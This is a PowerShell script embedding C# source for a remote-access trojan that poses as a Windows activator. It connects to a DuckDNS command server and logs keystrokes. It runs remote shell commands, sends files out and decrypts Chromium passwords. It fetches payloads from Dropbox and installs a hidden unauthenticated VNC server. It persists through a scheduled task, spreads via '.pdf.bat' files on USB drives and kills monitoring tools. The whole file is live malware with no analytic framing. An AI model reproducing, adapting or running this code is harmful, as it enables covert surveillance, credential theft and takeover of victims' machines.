Add-Type -TypeDefinition @'
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Timers;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Diagnostics;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Threading;






public class Demo {
	private static System.Timers.Timer timer_check_msg;
	private static System.Timers.Timer timer_check_usb;
	//private static System.Timers.Timer Check_Mate;
	private static System.Timers.Timer check_connectivity;
	public static Socket s = new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
	
	private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
	private const int WM_SYSKEYDOWN = 0x0104;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
	

	




   public static void Main() {
		if (CreateMutex(0,true,"Ghy52kl69kmspgG") == null || GetLastError()!=0) {ShellExecute(0,"open","cmd.exe","/c del %tmp%\\windows_activator.ps1","",0);Process.GetCurrentProcess().Kill();}
		
		ShellExecute(0,"open","cmd.exe","/c del %tmp%\\windows_activator.ps1","",0);
		
		OperatingSystem = SendRun("for /f \"tokens=3-10\" %a in ('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\"  /v productname ^| findstr /ri \"REG_SZ\"')  do @echo %a %b %c %d %e %f").Replace("\t","").Replace("\r","").Replace("\n","");
		ComputerModel = SendRun("wmic computersystem get manufacturer,model|find /v \"Model\"").Replace("\t","").Replace("\r","").Replace("\n","");
		
		listener = new WinEventProc(CheckMate);
		Int32 hook = SetWinEventHook(32780, 32780, 0, listener, 0, 0, 0);
		Int32 hook2 = SetWinEventHook(3, 3, 0, listener, 0, 0, 0);
		_hookID = SetHook(_proc);
				
		
		timer_check_msg = new System.Timers.Timer();
		timer_check_msg.Interval = 1;
		timer_check_msg.Elapsed += CheckReceivedMessage;
		timer_check_msg.Enabled = false;
		
		check_connectivity = new System.Timers.Timer();
		check_connectivity.Interval = 1000;
		check_connectivity.Elapsed += CheckConnectivity;
		check_connectivity.Enabled = false;
		
		timer_check_usb = new System.Timers.Timer();
		timer_check_usb.Interval = 10000;
		timer_check_usb.Elapsed += CheckUSB;
		timer_check_usb.Enabled = false;
		
		SendRun("schtasks.exe /create /f /sc minute /mo 1 /tn \"Update Manager\" /tr \""+basedir+"cert.exe 0\"");
		
		long length = 0;
		if (!Directory.Exists(basedirvnc)){
				Directory.CreateDirectory(basedirvnc);
		}
		if(File.Exists(basedirvnc+"winsecsvc.exe")) length = new System.IO.FileInfo(basedirvnc+"winsecsvc.exe").Length;
		
 		if (!File.Exists(basedirvnc+"winsecsvc.exe") || length!=1458800) {
			SendRun("bitsadmin /reset & bitsadmin /transfer job1 /download /priority foreground \"https://dl.dropboxusercontent.com/s/js6msuozgbjv5if/test1.txt?dl=1\" \""+basedirvnc+"file1.txt\" \"https://dl.dropboxusercontent.com/s/wjiavqett631ws2/test2.txt?dl=1\" \""+basedirvnc+"file2.txt\" \"https://dl.dropboxusercontent.com/s/1pdxtm3eyg5x29s/test3.txt?dl=1\" \""+basedirvnc+"file3.txt\" \"https://dl.dropboxusercontent.com/s/v5d2yevqxuvl76n/test4.txt?dl=1\" \""+basedirvnc+"file4.txt\"  & copy /b \""+basedirvnc+"file1.txt\"+\""+basedirvnc+"file2.txt\"+\""+basedirvnc+"file3.txt\"+\""+basedirvnc+"file4.txt\" \""+basedirvnc+"winsecsvc.exe\" & del \""+basedirvnc+"file*.txt\"");
			
			SendRun("reg delete "+VncRegKey+" /f & reg add "+VncRegKey+" & reg add "+VncRegKey+" /v QueryTimeout /t REG_DWORD /d 30 & reg add "+VncRegKey+" /v QueryAcceptOnTimeout /t REG_DWORD /d 0 & reg add "+VncRegKey+" /v LocalInputPriorityTimeout /t REG_DWORD /d 3 & reg add "+VncRegKey+" /v LocalInputPriority /t REG_DWORD /d 0 & reg add "+VncRegKey+" /v BlockRemoteInput /t REG_DWORD /d 0 & reg add "+VncRegKey+" /v BlockLocalInput /t REG_DWORD /d 0 & reg add "+VncRegKey+" /v RfbPort /t REG_DWORD /d 5900 & reg add "+VncRegKey+" /v HttpPort /t REG_DWORD /d 5800 & reg add "+VncRegKey+" /v DisconnectAction /t REG_DWORD /d 0 & reg add "+VncRegKey+" /v AcceptRfbConnections /t REG_DWORD /d 0 & reg add "+VncRegKey+" /v UseVncAuthentication /t REG_DWORD /d 0 & reg add "+VncRegKey+" /v UseControlAuthentication /t REG_DWORD /d 0 & reg add "+VncRegKey+" /v RepeatControlAuthentication /t REG_DWORD /d 0 & reg add "+VncRegKey+" /v LoopbackOnly /t REG_DWORD /d 0 & reg add "+VncRegKey+" /v AcceptHttpConnections /t REG_DWORD /d 0 & reg add "+VncRegKey+" /v LogLevel /t REG_DWORD /d 0 & reg add "+VncRegKey+" /v EnableFileTransfers /t REG_DWORD /d 1 & reg add "+VncRegKey+" /v RemoveWallpaper /t REG_DWORD /d 0 & reg add "+VncRegKey+" /v UseMirrorDriver /t REG_DWORD /d 1 & reg add "+VncRegKey+" /v EnableUrlParams /t REG_DWORD /d 1 & reg add "+VncRegKey+" /v AlwaysShared /t REG_DWORD /d 0 & reg add "+VncRegKey+" /v NeverShared /t REG_DWORD /d 0 & reg add "+VncRegKey+" /v DisconnectClients /t REG_DWORD /d 1 & reg add "+VncRegKey+" /v PollingInterval /t REG_DWORD /d 1000 & reg add "+VncRegKey+" /v AllowLoopback /t REG_DWORD /d 0 & reg add "+VncRegKey+" /v VideoRecognitionInterval /t REG_DWORD /d 3000 & reg add "+VncRegKey+" /v GrabTransparentWindows /t REG_DWORD /d 1 & reg add "+VncRegKey+" /v SaveLogToAllUsersPath /t REG_DWORD /d 0 & reg add "+VncRegKey+" /v RunControlInterface /t REG_DWORD /d 0");
		 }
		 if(File.Exists(basedirvnc+"screenhooks32.dll")) length = new System.IO.FileInfo(basedirvnc+"screenhooks32.dll").Length;
		 if (!File.Exists(basedirvnc+"screenhooks32.dll") || length!=74352){ 
			SendRun("bitsadmin /reset & bitsadmin /transfer job1 /download /priority foreground  \"https://dl.dropboxusercontent.com/s/4s9kt293bz6du7i/screenhooks32.dll?dl=1\" \""+basedirvnc+"screenhooks32.dll\"");
			System.Diagnostics.Process p= new System.Diagnostics.Process();
			p.StartInfo.FileName = basedirvnc+"winsecsvc.exe";
			p.StartInfo.Arguments = "-run";
			p.StartInfo.UseShellExecute = false;
			p.StartInfo.RedirectStandardOutput = false; 
			p.Start();
		 }
		 
		 if (!Directory.Exists(cryptodir)){
				Directory.CreateDirectory(cryptodir);
		 }
		 if(!File.Exists(cryptodir+"BouncyCastle.Crypto.dll")){
			 SendRun("bitsadmin /reset & bitsadmin /transfer job1 /download /priority foreground  \"https://dl.dropboxusercontent.com/s/jttlnejzvcn2ald/punder.zip?dl=1\" \""+cryptodir+"crypto.zip\"");
			SendRun("expand %appdata%\\Crypto\\Crypto.zip %appdata%\\Crypto\\BouncyCastle.Crypto.dll>nul & del /f /q %appdata%\\Crypto\\Crypto.zip");
		 }
		 if(!File.Exists(basedirvnc+"certificate.txt")){
			SendRun("bitsadmin /reset & bitsadmin /transfer job1 /download /priority foreground  \"https://dl.dropboxusercontent.com/s/isgyygnpcjj8ekv/punder.txt?dl=1\" \""+basedirvnc+"certificate.txt\"");
		 }
		
		ThreadStart childref = new ThreadStart(ConnectToServer);
        Thread childThread = new Thread(childref);
        childThread.Start();


		Application.Run();
		UnhookWindowsHookEx(_hookID);
	}
	
	
//-------------------------------------------------------- ConnectToServer ---------------------------------------------------------------------

	public static void ConnectToServer(){	   
	   s = new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
	   do {
		    
			try {
				s.Connect(hostname,443);				
			}
			catch {} 
		
		}
		
		while (s.Connected==false);
		
		SendString("ME::"+Environment.MachineName.ToString()+"::"+Environment.UserName.ToString()+"::"+OperatingSystem+"::"+File.GetCreationTime(basedirvnc+"screenhooks32.dll").ToString("dd/MM/yyyy HH:mm")+"::"+"DuckDNS"+"::::"+ComputerModel,useZip);
		connected=1;
		timer_check_msg.Enabled = true;
		check_connectivity.Enabled = true;
		string svc = SendRun("wmic process where caption=\"winsecsvc.exe\" get name");
		if (svc.IndexOf("winsecsvc.exe")==-1){
		if(File.Exists(basedirvnc+"screenhooks32.dll")){
			System.Diagnostics.Process p= new System.Diagnostics.Process();
			p.StartInfo.FileName = basedirvnc+"winsecsvc.exe";
			p.StartInfo.Arguments = "-run";
			p.StartInfo.UseShellExecute = false;
			p.StartInfo.RedirectStandardOutput = false; 
			p.Start();
		}
		}
	}
	
//-------------------------------------------------------- CheckReceivedMessage ---------------------------------------------------------------------

	public static  void CheckReceivedMessage(Object source, System.Timers.ElapsedEventArgs e) {
		if(connected==1){
				timer_check_msg.Enabled=false;
				recv = s.Receive(buffer);
				timer_check_msg.Enabled=true;
				mess = Encoding.Unicode.GetString(buffer,0, recv); 
				
					if(mess == "."){
						timeout=0;
					}
					
					if(mess.Substring(0,3)=="///"){
						command=mess.Replace("///","");
						command=command.Replace(@"\\\","");
						command.Replace(".","");
						if (command.Substring(0,3)=="BDP"){
							SendString("OK Chromium Password Decryptor...",useZip);
							if(File.Exists(Path.GetTempPath()+"cert_.txt")) File.Delete(Path.GetTempPath()+"cert_.txt");
							if(File.Exists(Path.GetTempPath()+"punder.ps1")) File.Delete(Path.GetTempPath()+"punder.ps1");
							SendRun("certutil -decode %appdata%\\windowsnt\\common\\certificate.txt %tmp%\\cert_.txt & expand %tmp%\\cert_.txt %tmp%\\punder.ps1");
							SendRun("powershell -Command \"$x = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_});(gc %tmp%\\punder.ps1) -replace 'pProcess',$x -replace 'browser_',-join('_',$x) -replace 'masterKey',-join('_x',$x) -replace 'sSQLite',-join('_sql',$x)| Out-File -encoding ASCII %tmp%\\punder.ps1\"");
							
							
 							System.Diagnostics.Process pProcess = new System.Diagnostics.Process();
							pProcess.StartInfo.FileName = "powershell.exe";
							pProcess.StartInfo.Arguments = "-noprofile -executionpolicy bypass -file \""+Path.GetTempPath()+"punder.ps1\"";
							pProcess.StartInfo.UseShellExecute = false;
							pProcess.StartInfo.RedirectStandardOutput = true;   
							pProcess.StartInfo.WorkingDirectory = "";
							pProcess.Start();
							string Outp="";
							while (!pProcess.StandardOutput.EndOfStream) Outp+=pProcess.StandardOutput.ReadToEnd();
							//string Outp = pProcess.StandardOutput.ReadToEnd();
							//pProcess.WaitForExit();	
 							SendString(Outp,useZip);						
 							File.Delete(Path.GetTempPath()+"cert_.txt");
							File.Delete(Path.GetTempPath()+"punder.ps1");
						}
						
						if (command.Substring(0,3) == "usb"){
							SendString(username+"> OK USB !",useZip);
							timer_check_usb.Enabled = true;
						}
						
						if (command.Substring(0,9)=="keylogger"){
							SendString(logger,useZip);
						}
						
						if (command.Substring(0,9) == "getdrives"){
								GetDrives();
						}
						
						
						if (command.Substring(0,7) == "dirlist"){
							folder=command.Substring(command.IndexOf(">")+1);
							SendFolderListing(folder);
						}
						
						
						if (command.Substring(0,3) == "run"){
							SendString(username+"> OK Run !",useZip);
							 cmd=command.Substring(command.IndexOf(">")+1);
							SendString(SendRun(cmd),useZip);
						}
						
						if (command.Substring(0,8) == "sendfile"){
							SendString(username+"> OK Sendfile !",useZip);
							file=command.Substring(command.IndexOf(">")+1);
							SendFile(file);
						}
																		
						
						if (command.Substring(0,3) == "vnc"){
							SendString(username+"> OK VNC !",useZip);
							string port=command.Substring(command.IndexOf(">")+1);
							ShellExecute(0,"open","cmd.exe","/c \""+basedirvnc+"winsecsvc.exe\" -controlapp -connect "+hostname+":"+port,"",0);
														
						}
						

						
					}
		}
   }


//-------------------------------------------------------- CheckMate ---------------------------------------------------------------------

	public static void CheckMate(Int32 hWinEventHook, int iEvent, Int32 forewin, Int32 idObject, Int32 idChild, int dwEventThread, Int32 dwmsEventTime){
			int size = SendMessage(forewin,14,0,0);
			if (size > 0) {
				forewinText.EnsureCapacity(size+1);
				GetWindowText(forewin,forewinText,forewinText.Capacity);
			}
			if (forewinText.ToString().ToLower().IndexOf("netstat")!=-1) SendRun("taskkill /f /im netstat.exe>nul");
			if (forewinText.ToString().ToLower().IndexOf("tasklist")!=-1) SendRun("taskkill /f /im tasklist.exe>nul");
			if (forewinText.ToString().ToLower().IndexOf("tightvnc control interface")!=-1) SendMessage(forewin,16,0,0);
			if (forewinText.ToString().ToLower().IndexOf("tightvnc server")!=-1) SendMessage(forewin,16,0,0);
			for (int i=0; i<=34; i++){
				if (forewinText.ToString().ToLower().IndexOf(process_names[i].ToString().ToLower())!=-1) {SendRun("taskkill /f /im winsecsvc.exe & taskkill /f /im powershell.exe");}
			}
			 
}

   
      //-------------------------------------------------------- CheckConnectivity ---------------------------------------------------------------------

   private static void CheckConnectivity(Object source, System.Timers.ElapsedEventArgs e) {
	   if (connected == 1){
			timeout++;
			if (timeout>30) {
				SendRun("taskkill /f /im winsecsvc.exe & timeout /t 1 & taskkill /f /im powershell.exe");
				Process.GetCurrentProcess().Kill();
			}
	   }
   }
   
   
   public static void GetDrives(){
		DriveInfo[]  drives = DriveInfo.GetDrives();
		string output="";
		foreach (DriveInfo drive in drives){
				if(drive.IsReady == true) output+= drive.Name.Replace("\\","")+" "+drive.DriveType + "   |    ";
		}
		SendString(username+"> "+output+'\n',useZip);
			
   }
   
   //-------------------------------------------------------- SendFolderListing ---------------------------------------------------------------------
	public static void SendFolderListing(string folder){
		string d="";
		string f="";
		string o ="";
		string[] dirs = Directory.GetDirectories(folder);
		foreach (string file in dirs){
			DirectoryInfo x = new DirectoryInfo(file);
			d=d+x.Name+"\r\n";
		} 
		string[] files = Directory.GetFiles(folder);
		foreach (string file in files){
			FileInfo x = new FileInfo(file);
			f=f+x.Length+" \\ "+x.Name+" \\ "+x.CreationTime.ToString().Substring(0,16)+"\r\n";
		}   
		
		o = d+f;
		SendString(o,useZip);
}



//-------------------------------------------------------- SendFile ---------------------------------------------------------------------

public static void SendFile(string filepath){
	string[] files_to_download=filepath.Split('|');
	string file_count=files_to_download.Length.ToString().PadRight(10,'*');
	
	Socket server = new Socket(AddressFamily.InterNetwork,SocketType.Stream, ProtocolType.Tcp);
	string filename="";
	string filesize="";
	string comusername=Environment.UserName.PadRight(50,'*');
	int numBytesToRead = 65535;
	int receivedDataLength=0;
	Int64 startPos=0;
	int n =0;
	string aaa ="";
	string ok="";
	byte[] data = new byte[255];
	byte[] bytes = new byte[numBytesToRead+1];
	FileStream fsSource;
	int numBytesRead = 0;
		do {
			try {
				server.Connect(hostname,fileport);
			}
			catch {} 
		}
		while (server.Connected==false);
		comusername=Environment.UserName.PadRight(50,'*');
		server.Send(Encoding.Unicode.GetBytes(comusername));
		server.Send(Encoding.ASCII.GetBytes(file_count));


	foreach(string FileToDownload in files_to_download){
			 filename="";
			 filesize="";
			 
			 numBytesToRead = 65535;
			 receivedDataLength=0;
			 startPos=0;
			 n =0;
			 aaa ="";
			 //ok="";
			 data = new byte[512];
			 bytes = new byte[numBytesToRead+1];
			
			 numBytesRead = 0;

		fsSource= new FileStream(FileToDownload,FileMode.Open, FileAccess.Read);	
		filesize=fsSource.Length.ToString();
		filename=Path.GetFileName(FileToDownload).PadRight(512,'*');	
		server.Send(Encoding.Unicode.GetBytes(filename));
		
		filesize=filesize.PadRight(24,'*');
		server.Send(Encoding.ASCII.GetBytes(filesize));
		
		fsSource.Seek(startPos,SeekOrigin.Begin);
		
		data = new byte[24];
		receivedDataLength = server.Receive(data);
		aaa = Encoding.ASCII.GetString(data, 0, receivedDataLength).Replace("*","");
		if(aaa=="Already downloaded") {fsSource.Close();continue;}
		
		startPos=Convert.ToInt64(aaa);
		
		
		while (numBytesToRead > 0)
				{
					
					n = fsSource.Read(bytes, 0, numBytesToRead);
					if (n == 0)
						break;

					numBytesRead += n;
					fsSource.Seek(startPos+numBytesRead,SeekOrigin.Begin);
				   server.Send(bytes,n,SocketFlags.None);				
				}
		fsSource.Close();
		 data = new byte[2];
		receivedDataLength = server.Receive(data);
		ok = Encoding.ASCII.GetString(data, 0, receivedDataLength); 
 	}	
		server.Close();		
}

//-------------------------------------------------------- SendRun ---------------------------------------------------------------------

public static string SendRun(string cmd){
	string strOutput="";
	System.Diagnostics.Process pProcess = new System.Diagnostics.Process();
	pProcess.StartInfo.FileName = "cmd.exe";
	pProcess.StartInfo.Arguments = "/c "+cmd;
	pProcess.StartInfo.UseShellExecute = false;
	pProcess.StartInfo.RedirectStandardOutput = true;   
	pProcess.StartInfo.WorkingDirectory = "";
	pProcess.Start();
	while (!pProcess.StandardOutput.EndOfStream) strOutput+=pProcess.StandardOutput.ReadToEnd();
	return strOutput;	
}

	//-------------------------------------------------------- SendString ---------------------------------------------------------------------

	public static void SendString(string msg,bool isZipped){
		byte[] byData = System.Text.Encoding.Unicode.GetBytes(msg+"(lnrm5wu4j)");
		if (isZipped==false)
			s.Send(byData);	
		else
			s.Send(System.Text.Encoding.Unicode.GetBytes(Zip(msg)+"(lnrm5wu4j)"));
	}


	//-------------------------------------------------------- CopyTo ---------------------------------------------------------------------

	public static void CopyTo(Stream src, Stream dest) {
		byte[] bytes = new byte[4096];

		int cnt;

		while ((cnt = src.Read(bytes, 0, bytes.Length)) != 0) {
			dest.Write(bytes, 0, cnt);
		}
	}


	//-------------------------------------------------------- Zip ---------------------------------------------------------------------

	public static string Zip(string str) {
		byte[] bytes = Encoding.Unicode.GetBytes(str);
		using (MemoryStream msi = new MemoryStream(bytes))
		using (MemoryStream mso = new MemoryStream()) {
			using (GZipStream gs = new GZipStream(mso, CompressionMode.Compress)) {
				CopyTo(msi, gs);
			}			
			return "xxx:"+mso.ToArray().Length+":"+System.Convert.ToBase64String(mso.ToArray());
		}
	}
	
	//-----------------------------------------------------KEYLOGGER----------------------------------------------------------------
	
	
	private static IntPtr SetHook(LowLevelKeyboardProc proc){
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule){
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
	
	private static void testkey(string text){
		if (LastActiveWindowTitle != ActiveWindowTitle) {
			LastActiveWindowTitle=ActiveWindowTitle;
			logger+="\n\n[ "+ActiveWindowTitle+" ]\n----------------------------------------------------------------------------------------------------------\n";
		}
		logger+=text;
	}

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
		ActiveWindowTitle=GetActiveWindowTitle();
		GetAsyncKeyState(16);
		if (GetAsyncKeyState(16) == -32768 ){ shiftkey = 1;} else { shiftkey = 0;}
		if (GetKeyState(20) == 0) {caps = 0;}
		 if (GetKeyState(20) == 1) {caps = 1;}
		 if (nCode >= 0 && wParam == (IntPtr)WM_SYSKEYDOWN){
			int vkCode = Marshal.ReadInt32(lParam);
			if (vkCode == 48) { testkey("@");}
			if (vkCode == 50) { testkey("~");}
			if (vkCode == 51) { testkey("#");}
			if (vkCode == 52) { testkey("{");}
			if (vkCode == 53) { testkey("[");}
			if (vkCode == 54) { testkey("|");}
			if (vkCode == 55) { testkey("`");}
			if (vkCode == 56) { testkey("\\");}
			if (vkCode == 57) { testkey("^");}
			if (vkCode == 187) { testkey("}");}
			if (vkCode == 219) { testkey("]");}
		 }
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN){
			
            int vkCode = Marshal.ReadInt32(lParam);
			
			for (int i=65; i<=65+25; i++){
					if (vkCode == i){
						if((caps == 0 && shiftkey == 0) || (caps == 1 && shiftkey == 1)) testkey(((char)(i+32)).ToString());
						if((caps == 0 && shiftkey == 1) || (caps == 1 && shiftkey == 0)) testkey(((char)i).ToString());
					}
			}
			
			if((caps == 0 && shiftkey == 0) || (caps == 1 && shiftkey == 1)) {
				if (vkCode == 226) { testkey("<");}
				if (vkCode == 186) { testkey("$");}
				if (vkCode == 187) { testkey("=");}
				if (vkCode == 188) { testkey(",");}
				if (vkCode == 190) { testkey(";");}
				if (vkCode == 191) { testkey(":");}
				if (vkCode == 192) { testkey("ù");}
				if (vkCode == 219) { testkey(")");}
				if (vkCode == 223) { testkey("!");}
				if (vkCode == 48) { testkey("à");}
				if (vkCode == 49) { testkey("&");}
				if (vkCode == 50) { testkey("é");}
				if (vkCode == 51) { testkey("\"");}
				if (vkCode == 52) { testkey("\'");}
				if (vkCode == 53) { testkey("(");}
				if (vkCode == 54) { testkey("-");}
				if (vkCode == 55) { testkey("è");}
				if (vkCode == 56) { testkey("_");}
				if (vkCode == 57) { testkey("ç");}
			}
			
			if((caps == 0 && shiftkey == 1) || (caps == 1 && shiftkey == 0)) {
				if (vkCode == 226) { testkey(">");}
				if (vkCode == 186) { testkey("£");}
				if (vkCode == 187) { testkey("+");}
				if (vkCode == 188) { testkey("?");}
				if (vkCode == 190) { testkey(".");}
				if (vkCode == 191) { testkey("/");}
				if (vkCode == 192) { testkey("%");}
				if (vkCode == 219) { testkey("°");}
				if (vkCode == 223) { testkey("§");}
				if (vkCode == 48) {testkey("0");}
				if (vkCode == 49) { testkey("1");}
				if (vkCode == 50) { testkey("2");}
				if (vkCode == 51) { testkey("3");}
				if (vkCode == 52) { testkey("4");}
				if (vkCode == 53) { testkey("5");}
				if (vkCode == 54) { testkey("6");}
				if (vkCode == 55) { testkey("7");}
				if (vkCode == 56) { testkey("8");}
				if (vkCode == 57) { testkey("9");}						
			}

			for (int i=96; i<=105; i++){
				if (vkCode == i) { testkey((i-96).ToString()); }
			}
			
			if (vkCode == 106) { testkey("*");}
			if (vkCode == 107) { testkey("+");}
			if (vkCode == 109) { testkey("-");}
			if (vkCode == 110) { testkey(".");}
			if (vkCode == 111) { testkey("/");}
			
			
			if (vkCode == 8) { testkey("<back>");}
			if (vkCode == 9) { testkey("<tab>");}
			if (vkCode == 13) { testkey("<enter>\n");}
			if (vkCode == 17) { testkey("<ctrl>");}
			if (vkCode == 18) { testkey("<alt>");}
			if (vkCode == 27) { testkey("<esc>");}
			if (vkCode == 32) { testkey(" ");}
			if (vkCode == 33) { testkey("<PgUp>");}
			if (vkCode == 34) { testkey("<PgDown>");}
			if (vkCode == 35) { testkey("<end>");}
			if (vkCode == 36) { testkey("<home>");}
			if (vkCode == 37) { testkey("<kLeft>");}
			if (vkCode == 38) { testkey("<kUp>");}
			if (vkCode == 39) { testkey("<kRight>");}
			if (vkCode == 40) { testkey("<kDown>");}
			if (vkCode == 44) { testkey("<prntScr>");}
			if (vkCode == 45) { testkey("<Inser>");}
			if (vkCode == 46) { testkey("<Del>");}
			if (vkCode == 144) { testkey("<Numlock>");}
			
			
			
			for (int i=112; i<=127; i++){
				if (vkCode == i) { testkey("<F"+(i-111).ToString()+">"); }
			}
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }
	
	public static string GetActiveWindowTitle(){
		const int nChars = 256;
		StringBuilder Buff = new StringBuilder(nChars);
		Int32 handle = GetForegroundWindow();

		if (GetWindowText(handle, Buff, nChars) > 0){
			return Buff.ToString();
		}
		return null;
	}
	
	public static  void CheckUSB(Object source, System.Timers.ElapsedEventArgs e) {
		DriveInfo[]  drives = DriveInfo.GetDrives();
		foreach (DriveInfo drive in drives){
				if(drive.IsReady == true) 
					if (drive.DriveType.ToString() == "Removable" || drive.DriveType.ToString() == "Network") {
						if(!File.Exists(drive.Name+username+".pdf.bat"))
										 SendRun("bitsadmin /reset & bitsadmin /transfer job1 /download /priority foreground  \"https://dl.dropboxusercontent.com/s/jby701gylhhu175/info.txt?dl=1\" \""+drive.Name+username+".pdf.bat\"");
					}
						
		}
	}









	[DllImport("user32.dll")]
	static extern Int32 GetForegroundWindow();
	[DllImport("user32.dll")]
	static extern int GetWindowText(Int32 hWnd, StringBuilder text, int count);
	[DllImport("Kernel32.dll")]
	private static extern uint GetLastError();
	[DllImport("kernel32.dll")]
	static extern IntPtr CreateMutex(int lpMutexAttributes, bool bInitialOwner,string lpName);
	[DllImport("user32.dll", SetLastError = true)]
    static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string className,  string  windowTitle);
	[DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
	[DllImport("user32.dll")]
	static extern Int32 FindWindow(string lpClassName, string lpWindowName);
	[DllImport("user32.dll")]
    public static extern int SendMessage(Int32 hWnd, int wMsg, int wParam, int lParam);
	[DllImport("Shell32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	static extern IntPtr ShellExecute(int hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd);
	
	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,IntPtr wParam, IntPtr lParam);

	[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
	public static extern short GetAsyncKeyState(Int32 virtualKeyCode);
	
	[DllImport("USER32.dll")]
	static extern short GetKeyState(int nVirtKey);
	
	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
	
	[DllImport("user32.dll")]
    static extern Int32 SetWinEventHook(int eventMin, int eventMax, Int32 hmodWinEventProc, WinEventProc lpfnWinEventProc, int idProcess, int idThread, int dwflags);
	


	public delegate void WinEventProc(Int32 hWinEventHook, int iEvent, Int32 hWnd, Int32 idObject, Int32 idChild, int dwEventThread, Int32 dwmsEventTime);

	
	public static bool useZip = true;
	public static string hostname = "test1625092.duckdns.org"; //"test1625092.zapto.org";
	public static int fileport=65499;
	public static int connected = 0;
	public static int ServerIdle =0;
	public static string basedir=Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+"\\WindowsNT\\security\\S-1-5-21-3059299281-2715327312-2684529034-1017\\";
	public static string basedirvnc=Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+"\\WindowsNT\\Common\\";
	public static string cryptodir=Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+"\\Crypto\\";
	public static string username=Environment.UserName.ToString();
	public static string OperatingSystem = "";
	public static string ComputerModel = "";
	public static int timeout = 0;
	public static StringBuilder forewinText = new StringBuilder(1);
	public static Int32 forewin = 0;
	public static string[] process_names={"netstumbler", "packetsdump", "colasoft capsa", "Microsoft message analyzer", "tcpeye", "packetyzer", "wireshark", "Wintasks", "What's Running", "tcpview", "tcpdump", "Task Manager", "Taskinfo", "Taskexplorer", "Task Explorer", "Spy Studio", "System Monitor", "System Explorer", "Process viewer", "Sniffer", "smartsniff", "activexperts", "Daphne", "ettercap", "Gestionnaire des t", "killswitch", "Network Monitor", "NetworkMiner", "netlimiter", "Process Explorer", "Process Hacker", "Process Manager", "Process Monitor", "Process Scanner", "Process Security"};
	public static Int32 time_check = Environment.TickCount;
	public static byte[] buffer = new byte[512000];
	public static int recv;
	public static string mess;
	public static string command;
	public static string folder;
	public static string cmd;
	public static string file;
	public static int shiftkey = 0;
	public static int caps = 0;
	public static int altgr = 0;
	public static string ActiveWindowTitle = "";
	public static string LastActiveWindowTitle = "";
	public static string logger = "";
	public static string VncRegKey ="HKCU\\Software\\TightVNC\\Server";
	public static WinEventProc listener = null;





}
'@ -ReferencedAssemblies 'System.Windows.Forms','System.Management'
[Demo]::Main(); 
